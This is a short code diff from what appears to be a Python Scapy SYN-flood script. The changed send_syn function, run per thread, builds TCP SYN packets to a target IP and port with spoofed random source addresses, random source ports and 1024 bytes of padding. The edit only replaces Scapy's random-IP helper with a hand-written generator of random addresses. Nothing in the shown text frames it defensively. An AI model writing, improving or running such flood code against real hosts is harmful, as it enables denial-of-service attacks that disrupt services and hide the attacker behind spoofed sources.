@@ -95,7 +95,8 @@ def send_packet(sock):
 def send_syn(thread_id):
     global packet_counter
 
-    ip_layer = IP(src=RandIP("*.*.*.*"), dst=ip)
+    src_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
+    ip_layer = IP(src=src_ip, dst=ip)
     tcp_layer = TCP(sport=RandShort(), dport=port, flags="S")
     raw_layer = Raw(b"X"*1024)
     p = ip_layer / tcp_layer / raw_layer
